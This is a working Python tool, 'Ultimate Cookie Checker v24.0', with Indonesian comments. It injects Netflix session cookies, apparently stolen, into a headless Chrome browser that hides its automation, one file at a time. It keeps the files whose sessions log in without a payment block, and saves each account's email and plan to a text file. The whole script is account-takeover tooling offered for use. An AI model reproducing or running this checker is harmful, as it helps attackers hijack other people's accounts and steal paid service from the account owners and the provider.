#!/usr/bin/env python3
import os
import sys
import time
import glob
import shutil
from datetime import datetime

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# ===================================================================
# KONFIGURASI WARNA CLI (Premium UI)
# ===================================================================
H = '\033[92m'  # Hijau Terang
B = '\033[94m'  # Biru
Y = '\033[93m'  # Kuning
R = '\033[91m'  # Merah
W = '\033[97m'  # Putih
N = '\033[0m'   # Reset

# ===================================================================
# KONFIGURASI FOLDER
# ===================================================================
COOKIE_FOLDER = "cookies"
ACTIVE_FOLDER = "active_account"
ACCOUNTS_FILE = "netflix_accounts.txt"
LOG_FILE = "scan_history.log"

# ===================================================================
# FUNGSI BANNER & LOGO
# ===================================================================
def print_banner():
    banner = f"""
{Y}
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗██╗ ██╗   ┃
┃  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██║ ██║   ┃
┃  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ ██║ ██║   ┃
┃  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██║ ╚═╝   ┃
┃  ██║ ╚████║██║        ██║   ███████╗██╔╝ ██╗██║ ██╗   ┃
┃  ╚═╝  ╚═══╝╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝ ╚═╝   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
         🗡️   ULTIMATE COOKIE CHECKER v24.0   🗡️
            by adooo · Open Source Premium
{N}"""
    print(banner)

# ===================================================================
# FUNGSI UTILITY
# ===================================================================
def ensure_folders():
    os.makedirs(ACTIVE_FOLDER, exist_ok=True)
    os.makedirs(COOKIE_FOLDER, exist_ok=True)

def get_all_cookie_files():
    return glob.glob(os.path.join(os.getcwd(), COOKIE_FOLDER, "*.txt"))

def parse_cookies(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        cookies = []
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'): continue
            parts = line.split('\t')
            if len(parts) >= 7:
                cookies.append({
                    'name': parts[5], 'value': parts[6], 'domain': parts[0],
                    'path': parts[2], 'secure': parts[3] == 'TRUE', 'expiry': int(parts[4]) if parts[4].isdigit() else None
                })
        return cookies if cookies else None
    except Exception:
        return None

def remove_cookie_file(file_path):
    try: os.remove(file_path); return True
    except Exception: return False

def move_cookie_file(file_path):
    try:
        shutil.move(file_path, os.path.join(os.getcwd(), ACTIVE_FOLDER, os.path.basename(file_path)))
        return True
    except Exception: return False

def log_to_file(message):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().isoformat()}] {message}\n")

# ===================================================================
# CORE SCAN ENGINE (PREMIUM CHECKS)
# ===================================================================
def scan_file(file_path, index, total):
    file_name = os.path.basename(file_path)
    # Progress bar yang dinamis (tanpa membuat baris baru)
    print(f"\r{B}⏳ Scanning [{index:03}/{total:03}]: {W}{file_name:<40}{N}", end='', flush=True)

    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument('--log-level=3')
    
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    driver.implicitly_wait(5)

    try:
        cookies = parse_cookies(file_path)
        if not cookies:
            remove_cookie_file(file_path)
            print(f"\r{R}⛔ [{index:03}/{total:03}] {W}INVALID FORMAT: {file_name:<40}{N}")
            driver.quit()
            return False

        # Buka Login & Inject Cookies
        driver.get('https://www.netflix.com/login')
        time.sleep(2)
        for c in cookies:
            try:
                clean_c = {'name': c['name'], 'value': c['value'], 'domain': '.netflix.com', 'path': '/'}
                if c.get('expiry') and isinstance(c['expiry'], int): 
                    clean_c['expiry'] = c['expiry']
                driver.add_cookie(clean_c)
            except: pass

        driver.get('https://www.netflix.com/login')
        time.sleep(3)

        # TES LOGIN MANUAL
        try:
            sign_in_btn = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Sign In')]"))
            )
            sign_in_btn.click()
            time.sleep(5)
        except:
            pass

        final_url = driver.current_url
        page_source = driver.page_source

        # PREMIUM FILTER: Deteksi Kuat untuk Payment Hold
        payment_keywords = [
            "Update payment", "Select Plan", "add payment", "Payment method", 
            "We were unable to process", "Billing", "Subscription", "Plan details",
            "choose your plan", "confirm your payment", "Your plan is paused"
        ]
        is_payment_hold = any(keyword in page_source for keyword in payment_keywords)

        # VALIDASI INTI
        if 'browse' in final_url and not is_payment_hold:
            # >> AKUN SUPER VALID! <<
            try:
                email = driver.find_element(By.CSS_SELECTOR, '.account-email').text.strip()
                plan = driver.find_element(By.CSS_SELECTOR, '.plan-details, .membership-plan').text.strip()
            except:
                email, plan = "Unknown", "Unknown"
            
            # Simpan ke File .txt
            with open(ACCOUNTS_FILE, 'a', encoding='utf-8') as f:
                f.write(f"Email: {email}\nPlan: {plan}\nFile: {file_name}\nDate: {datetime.now()}\n{'-'*50}\n")
            
            move_cookie_file(file_path)
            log_to_file(f"SUCCESS: {email} | {plan}")
            driver.quit()
            
            print(f"\r{H}✅ [{index:03}/{total:03}] {W}{email:<40} {H}| {plan}{N}")
            return True
            
        else:
            # >> GAGAL (Terkena Payment / Error) <<
            remove_cookie_file(file_path)
            log_to_file(f"FAILED: {file_name} (Payment Hold/Invalid)")
            driver.quit()
            
            if is_payment_hold:
                print(f"\r{Y}💳 [{index:03}/{total:03}] {W}PAYMENT BLOCK: {file_name:<40}{N}")
            else:
                print(f"\r{R}⛔ [{index:03}/{total:03}] {W}INVALID LOGIN: {file_name:<40}{N}")
            return False

    except Exception as e:
        try: driver.quit()
        except: pass
        remove_cookie_file(file_path)
        print(f"\r{R}⚠️ [{index:03}/{total:03}] {W}SYSTEM ERROR: {file_name:<40}{N}")
        return False

# ===================================================================
# MAIN PROGRAM
# ===================================================================
def main():
    ensure_folders()
    print_banner()
    
    files = get_all_cookie_files()
    total = len(files)
    
    print(f"{W}╔══════════════════════════════════════════╗{N}")
    print(f"{W}║ 📂  Total Cookies Loaded: {H}{total:03}{W} files{N}")
    print(f"{W}║ 🗡️  Mode: Premium Auto-Check {N}")
    print(f"{W}╚══════════════════════════════════════════╝{N}")
    print()
    
    if total == 0:
        print(f"{R}❌ ERROR: Folder '{COOKIE_FOLDER}' is empty!{N}")
        print(f"{Y}💡 Tip: Place your .txt files into the 'cookies' folder and try again.{N}")
        return

    print(f"{W}▶ Initializing scan engine...{N}")
    time.sleep(1)
    
    success_count = 0
    
    for i, file_path in enumerate(files):
        if scan_file(file_path, i + 1, total):
            success_count += 1

    print(f"\n{W}╔══════════════════════════════════════════╗{N}")
    if success_count > 0:
        print(f"{W}║ {H}✅ SCAN COMPLETED! Found {success_count} Valid Accounts{N}")
        print(f"{W}║ {H}📁 Saved to folder: '{ACTIVE_FOLDER}'{N}")
        print(f"{W}║ {H}📝 Report saved to: '{ACCOUNTS_FILE}'{N}")
    else:
        print(f"{W}║ {R}❌ SCAN COMPLETED. No usable accounts found.{N}")
    print(f"{W}║ 🗡️ by adooo ;P{N}")
    print(f"{W}╚══════════════════════════════════════════╝{N}")

if __name__ == "__main__":
    main()